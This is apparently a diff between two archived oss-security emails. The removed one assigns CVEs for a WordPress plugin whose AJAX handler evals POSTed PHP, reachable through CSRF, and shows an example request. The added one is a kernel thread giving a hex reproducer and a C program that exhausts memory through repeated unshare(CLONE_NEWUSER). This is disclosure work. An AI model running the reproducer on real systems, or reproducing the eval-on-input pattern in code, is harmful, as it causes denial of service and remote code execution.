@@ -1,80 +1,75 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/05/18/11
-Message-ID: <5197EAAD.40409@redhat.com>
-Date: Sat, 18 May 2013 14:55:09 -0600
-From: Kurt Seifried <kseifried@...hat.com>
-To: oss-security@...ts.openwall.com
-CC: Henri Salo <henri@...v.fi>, plugins@...dpress.org
-Subject: Re: CVE request: WordPress plugin wp-cleanfix CSRF
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/08/06/8
+Message-ID: <CALCETrWrH-1tz1C9rk49E23Evdn=r7AoqOrL5AQMQy3fvzRy8w@mail.gmail.com>
+Date: Tue, 6 Aug 2013 11:12:56 -0700
+From: Andy Lutomirski <luto@...capital.net>
+To: Oleg Nesterov <oleg@...hat.com>
+Cc: security@...nel.org, oss-security@...ts.openwall.com,  Petr Matousek <pmatouse@...hat.com>, "Eric W. Biederman" <ebiederm@...ssion.com>,  Linus Torvalds <torvalds@...ux-foundation.org>
+Subject: Re: CLONE_NEWUSER local DoS
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+On Tue, Aug 6, 2013 at 9:47 AM, Oleg Nesterov <oleg@...hat.com> wrote:
+> On 08/06, Petr Matousek wrote:
+>>
+>> spender reported [1] a local DoS triggerable by unprivileged user when
+>> user namespaces are enabled (CONFIG_USER_NS).
+>>
+>>   [1] https://twitter.com/grsecurity/status/364566062336978944
+>>
+>> Reproducer:
+>>
+>> b836010000bb00000010cd80ebf2 is for(;;)unshare(1<<28);
+>
+> What happens? OOM?
+>
+> I'll recheck, but at first glance this is simple, unshare_userns()
+> populates new_cred which is not freed by bad_unshare_cleanup_fd
+> if create_user_ns() fails. And create_user_ns() _should_ fail (iiuc)
+> when CLONE_NEWUSER is called for the second time and later due to
+> !kuid_has_mapping().
+>
+> I'll send the patch, but perhaps there is something else. Eric?
 
-On 05/18/2013 03:50 AM, Henri Salo wrote:
-> On Sat, May 18, 2013 at 12:54:23AM -0600, Kurt Seifried wrote:
->> Sorry I'm not clear, this appears to be two vulns, a CSRF, and a 
->> remote code exec, the remote code exec can be triggered via the
->> CSRF (so remote anon attacker can pull this off with some social 
->> engineering/etc.), but can also be done by users with access?
->> Thanks.
-> 
-> File wpCleanFixAjax.php contains:
-> 
-> 30         $command = strip_tags( $_POST['command'] ); 31
-> eval ( $command );
-> 
-> and there is:
-> 
-> 12 if ( is_admin() && _wpdk_is_ajax() ) {
-> 
-> So it only work when logged in administrator. This is not a
-> security vulnerability as is, because WordPress administrator can
-> upload/edit PHP as she or he likes.
-> 
-> There is a CSRF vulnerability, which can be used to execute
-> arbitrary PHP.
-> 
-> POST /wordpress/wordpress-351/wp-admin/admin-ajax.php 
-> action=wpCleanFixAjax&command=echo phpversion();
-> 
-> So in short: two vulnerabilities, but eval can't be used without
-> CSRF as far as I can tell.
-> 
-> --- Henri Salo
+I think that's right.  OTOH, it's not going to prevent this from OOMing:
 
+#define _GNU_SOURCE
+#include <unistd.h>
+#include <sched.h>
+#include <sys/types.h>
+#include <sys/wait.h>
+#include <fcntl.h>
+#include <stdio.h>
+#include <string.h>
+#include <err.h>
 
-Ok this is a slightly messy one. Normally yes, WP admin can modify the
-site and thus execute arbitrary PHP, so a remote flaw that allows php
-command execution only for admin would be a security flaw (e.g. worth
-of hardening) but not typically a security vulnerability (e.g. worthy
-of a CVE and full security treatment).
+#ifndef CLONE_NEWUSER
+#define CLONE_NEWUSER 0x10000000
+#endif
 
-However in this case it is exploitable, the CSRF provides a vector for
-exploitation. So it's gets a separate CVE.
+static void setmap(int is_gid, int outer)
+{
+  int fd = open(is_gid ? "/proc/self/gid_map" : "/proc/self/uid_map",
+		O_RDWR | O_CLOEXEC);
+  if (fd == -1)
+    err(1, is_gid ? "open /proc/self/gid_map" : "open /proc/self/uid_map");
+  char buf[128];
+  sprintf(buf, "0 %d 1\n", outer);
+  if (write(fd, buf, strlen(buf)) < 0)
+    err(1, is_gid ? "write /proc/self/gid_map" : "write /proc/self/uid_map");
+  close(fd);
+}
 
-So please use CVE-2013-2108 for the WordPress plugin wp-cleanfix CSRF
+int main(int argc, char **argv)
+{
+  pid_t outer_uid = geteuid(), outer_gid = getegid();
 
-And please use CVE-2013-2109 for the WordPress plugin wp-cleanfix Code
-Execution
+  while(1) {
+    if (unshare(CLONE_NEWUSER) != 0)
+      err(1, "unshare(CLONE_NEWUSER)");
+    setmap(1, outer_gid);
+    setmap(0, outer_uid);
+    outer_uid = outer_gid = 0;
+  }
+}
 
-- -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.13 (GNU/Linux)
-
-iQIbBAEBAgAGBQJRl+qtAAoJEBYNRVNeJnmT8aEP93mY/3AQjDkAdaflQVO1jkAH
-YRl8t9HJgwqvSYHhzb7cRNXVUBiIjXp/p2CeCFr6YZVwMWwNj2I2J5nvWSl4SZ0a
-Q7XsEFzYk5IzM0H+tkG6o9k4+2kHbSbSLgIAY66NmmqRH2yrFI0yGbZmh6rnOQew
-YShWETw+cBBkRE6eaFGGY3HwrgRnrxSLhq4ZbeXJw5JTQSmBJuvcFcRwMDtik1xb
-WdlDPRPZ2QXstHYUnHhr1ar8v1H8T0xegbcLqa0mYO6x0hJTlEjizon6OxSOYCf9
-nxQxIGceMbky30YmuN/4+D77gKLQONPdrK3KhSmlI7BPpxG4uv3IQbNwtjTooj3f
-bG4ogr2E7tPSVIzjFv/oHGyattFUkkOK7pQxthrWxXaQOsy0ULjHuPXKOwxByT9n
-t6QaF+TXYZgg3esoKlWBI40sHDJEVpskMxnlq+2RX4KIk6rmINMqk1Dk/5AqwkhL
-CqeN2SbBVUZ/iII2DbDV7sPK6YYMGQJH1/mSaWzZiFaGDnoZltnofvkJgQe9/x1E
-vYkJlyl0gi1q49Olz9MprIv2t4vxg1mS+4bnyPnRJ4xrw8OBheevmT4tTCsIDXF2
-oFbtEnwJdekBf6d1tjOUbEnj8aJlSYQ2UdCwRwg4PjgnGAfqvolk7joGC0rawHna
-H59nYKmVh8R/YiPKQ5o=
-=jXn+
------END PGP SIGNATURE-----
+--Andy
